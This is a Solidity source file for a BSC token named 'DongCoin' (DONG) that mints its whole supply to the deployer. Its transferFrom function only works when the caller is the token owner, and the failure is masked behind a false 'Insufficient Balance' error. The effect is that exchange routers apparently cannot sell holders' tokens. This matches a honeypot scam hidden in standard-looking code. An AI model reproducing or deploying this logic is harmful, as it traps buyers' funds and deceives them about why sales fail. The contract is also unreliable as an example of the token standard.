/**
 *Submitted for verification at BscScan.com on 2022-01-25
*/

//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.2;

contract DongCoin {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;

    
    uint public totalSupply=100000000 * 10 ** 18;
    uint public decimals = 18;
    string public name = "DongCoin";
    string public symbol = "DONG";
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {   
        balances[msg.sender] = totalSupply;
    }
    
 
    function balanceOf(address owner) public returns(uint) {
        return balances[owner];
    }
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'Insufficient Balance');
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
  
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(msg.sender==from,'Insufficient Balance');
        require(balanceOf(from) >= value, 'Insufficient Balance');
        require(allowance[from][msg.sender] >= value, 'Insufficient Balance');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}